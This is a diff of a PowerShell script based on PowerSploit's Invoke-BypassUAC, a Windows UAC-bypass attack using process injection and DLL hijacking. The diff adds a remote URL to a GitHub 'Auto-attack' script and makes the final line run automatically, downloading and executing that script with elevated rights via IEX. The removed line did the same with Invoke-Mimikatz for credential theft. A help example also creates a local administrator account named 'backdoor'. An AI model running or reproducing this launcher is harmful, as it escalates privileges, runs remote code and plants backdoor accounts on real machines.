@@ -1,61 +1,44 @@
+$admin = 'https://raw.githubusercontent.com/zp1in/Auto-attack/master/admin.ps1'
+
 function Invoke-BypassUAC
 {
     <#
     .SYNOPSIS
-
     Performs the bypass UAC attack by utilizing the trusted publisher 
     certificate through process injection. 
-
     PowerSploit Function: Invoke-BypassUAC
     Author: @sixdub, @harmj0y, @mattifestation, @meatballs__, @TheColonial
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-
     .DESCRIPTION
-
     If a payload .dll is used, please set it to use ExitProcess. If a command is 
     specified, a self-deleting launcher.bat will be created that executes a given 
     command in an elevated context. This version should work on both Windows 7 and
     Windows 8/8.1.
-
     The BypassUAC attack was originally published by Leo Davidson.
     See http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html 
     for more technical details.
-
     This work is heavily based on PowerSploit's Invoke--Shellcode.ps1 script from 
     Matthew Graeber (@mattifestation).
-
     It also utlizes the elevator .dll from the Metasploit project from 
     Ben Campbell (@meatballs__) and OJ Reeves (@TheColonial).
-
     .PARAMETER PayloadPath
-
     The path of the .dll payload you want to run in an elevated context.
-
     .PARAMETER Command
-
     Command to run in an elevated context if a custom .dll isn't specified.
-
     .PARAMETER PatchExitThread
-
     Use this switch if you would like the script to automatically patch the "ExitThread" bytes 
     to "ExitProcess". This ensures the target hijack process exits cleanly and does not cause 
     a popup. This technique should be used for Metasploit payloads and any payload that does 
     not properly shut down the process on its' own. 
-
     .EXAMPLE
-
-    PS C:\> Invoke-BypassUAC -Command 'net user evi1cg "Password123!" /add && net localgroup administrators evi1cg /add"' -Verbose
+    PS C:\> Invoke-BypassUAC -Command 'net user backdoor "Password123!" /add && net localgroup administrators backdoor /add"' -Verbose
     
     Create a local user 'backdoor' and add it to the local administrators group.
-
     .EXAMPLE
-
     Invoke-BypassUAC -PayloadPath .\payload.dll -Verbose
-
     Run a custom .dll payload in an elevated context.
-
     .LINK
     https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke--Shellcode.ps1
     https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac_injection.rb
@@ -84,7 +67,7 @@ function Invoke-BypassUAC
         "[!] Current user not a local administrator!"
         Throw ("Current user not a local administrator!")
     }
-    if (($(whoami /groups) -like "*Medium Mandatory Level*").length -eq 0) {
+    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
         "[!] Not in a medium integrity process!"
         Throw ("Not in a medium integrity process!")
     }
@@ -93,13 +76,10 @@ function Invoke-BypassUAC
         <#
         .SYNOPSIS
         Patches a string in a binary byte array.
-
         .PARAMETER DllBytes
         Binary blog to patch.
-
         .PARAMETER FindString
         String to search for to replace.
-
         .PARAMETER ReplaceString
         String to replace FindString with
         #>
@@ -146,19 +126,15 @@ function Invoke-BypassUAC
         .SYNOPSIS
         Writes out a hijackable .dll that launches a 'debug.bat' file in the 
         same location as the .dll.
-
         .PARAMETER OutputFile
         File name to write the .dll to.
-
         .PARAMETER BatchPath
         Patch to the .bat for the .dll to launch. Defaults to "debug.bat" in the
         .dll's current directory.
-
         .PARAMETER Arch
         Architeture of .dll to generate, x86 or x64. If not the architecture is not
         explicitly specified, the code will try to automatically determine what's
         appropriate.
-
         Author: @harmj0y
         License: BSD 3-Clause
         #>
@@ -303,10 +279,10 @@ function Invoke-BypassUAC
                 Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
             }
         }
-        #XP/Win8/Win0
+        #XP/Win8
         else
         {
-            Write-Verbose "Windows XP/8/10 detected, using CreateRemoteThread. Address of thread: $StartAddress"
+            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
             $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
         }
      
@@ -560,7 +536,7 @@ function Invoke-BypassUAC
         $szElevExeFull = "$szElevDir\cliconfg.exe"
         $szElevDllFull = "$szElevDir\$szElevDll"
         $szTempDllPath = $TempPayloadPath
-        Write-Verbose "Windows 8/2012/10 detected"
+        Write-Verbose "Windows 8/2012 detected"
     }
     else {
         "[!] Unsupported OS!"
@@ -608,4 +584,4 @@ function Invoke-BypassUAC
     Write-Verbose "Removing temporary payload $TempPayloadPath"
     Remove-Item -Path $TempPayloadPath -Force
 }
-#invoke-BypassUAC -Command "powershell -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://lzp.org.cn/Invoke-Mimikatz.ps1');Invoke-Mimikatz > c:\pa.txt"
+Invoke-BypassUAC -Command "powershell.exe -ep bypass -nologo -nop IEX(new-object net.webclient).downloadstring($admin)"
